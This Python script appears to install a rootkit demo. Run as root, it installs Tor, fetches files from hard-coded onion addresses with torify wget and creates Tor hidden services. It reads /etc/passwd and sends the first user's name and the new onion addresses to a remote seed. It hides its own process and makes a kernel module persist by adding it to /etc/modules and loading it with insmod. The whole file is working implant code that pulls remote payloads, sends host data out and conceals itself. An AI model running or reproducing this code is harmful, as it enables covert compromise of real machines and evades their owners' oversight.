import os
from os import path
import time
import socket
import subprocess
import sys

ENCODING = "latin1"

seed_directions = [
    ("kdq2tg4jedd5tqxs.onion", "57yvvr2pfb46zull.onion"),
]

tor_hidden_service_path = "/var/lib/tor"
torrc_path = "/etc/tor/torrc"
hidden_folder_path = "/etc/rootkit_demo"
hidden_private_folder_path = os.path.join(hidden_folder_path, "private")
hidden_private_folder_path = os.path.join(hidden_folder_path, "private")
hidden_public_folder_path = os.path.join(hidden_folder_path, "public")
hidden_source_folder = os.path.join(hidden_public_folder_path, "source")
start_server_script = os.path.join(hidden_source_folder, "server.py")

down_port = 40000
tor_down_port = 40001
comm_port = 50000
tor_comm_port = 50001

# Install required tools
os.system("apt install -y tor")
os.system("apt install -y python3-pip")
os.system("pip3 install --upgrade pysocks")
os.system("pip3 install --upgrade cryptography")
# We can import this after installing it
import socks

os.mkdir(hidden_folder_path)
os.mkdir(hidden_public_folder_path)
os.mkdir(hidden_private_folder_path)
pid = os.getpid()
# All the processes written in this file will be hidden
# from commands like ps
process_file = os.path.join(hidden_folder_path, "process")
with open(process_file, "a") as process_file:
    process_file.write(f"{pid}\n")

# Try to download files from one of the seeds
comm_address = None
for i, address_pair in enumerate(seed_directions):
    if not os.path.exists(hidden_source_folder):
        down_address = address_pair[0]
        comm_address = address_pair[1]
        command = f'torify wget {down_address}:{tor_down_port}/ -r -np -nH -R "index.html*" -P {hidden_public_folder_path}'
        os.system(command)
    if i == len(seed_directions):
        sys.exit()
os.system(f"echo seed {down_address} {comm_address} >> {hidden_public_folder_path}/peer_list")
os.system(
    f"cp {hidden_public_folder_path}/peer_list {hidden_private_folder_path}/full_peer_list"
)

# Create hidden services
# 1. Create name of the hidden service folder
# 2. Open config tor file and add hidden service at the end

# Create simple http server hidden service
hidden_web_folder = os.path.join(tor_hidden_service_path, "hidden_download")
with open(torrc_path, "a") as torrc_file:
    torrc_file.write(f"HiddenServiceDir {hidden_web_folder}\n")
    torrc_file.write(f"HiddenServicePort {tor_down_port} localhost:{down_port}\n")

# Create communicaiton hidden service
hidden_comm_folder  = os.path.join(tor_hidden_service_path , "hidden_communication")
with open(torrc_path, "a") as torrc_file:
    torrc_file.write(f"HiddenServiceDir {hidden_comm_folder}\n")
    torrc_file.write(f"HiddenServicePort {tor_comm_port} localhost:{comm_port}\n")

# Restart tor so that the hidden services are created
os.system("systemctl restart tor")
time.sleep(1)

# Now we will send to the seed: our user, and the new created onion addresses
# Save the onion addresses
with open(os.path.join(hidden_web_folder, "hostname"), "r") as onion:
    web_onion = onion.read().strip()

with open(os.path.join(hidden_comm_folder, "hostname"), "r") as onion:
    comm_onion = onion.read().strip()

# Save the username of the first created user in this computer
passwd_file_content = str(
    subprocess.run(["cat", "/etc/passwd"], stdout=subprocess.PIPE)
).split("\\n")
user = [line for line in passwd_file_content if "1000" in line][0].split(":")[0]

# Send info to seed through TOR
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
client_socket = socks.socksocket()
client_socket.connect((comm_address, tor_comm_port))

# Build and send the message to update the server peer list
msg = f"0<<default<<0<<{user} {web_onion} {comm_onion}<<no signed hash"
final_msg = msg.encode(ENCODING)
client_socket.send(final_msg)
client_socket.close()

# Now that we have all the information downloaded and we sent the message,
# it is time to start the onion services and hide them. (We will not
# need to hide them really. Since we are hiding this process, all the process
# that have this one as parent will be hidden too.


# os.system(f"python3 {start_server_script} &")
# os.system(f"cd {hidden_public_folder_path}; python3 -m http.server {down_port} &")

# Insert linux kernel module
rootkit = os.path.join(hidden_source_folder, "rootkit.ko")
linux_version = os.uname()[2]
os.system(f"cp {rootkit} /lib/modules/{linux_version}/kernel/drivers/acpi")
os.system(f"echo rootkit >> /etc/modules")
os.system(f"insmod {rootkit}")
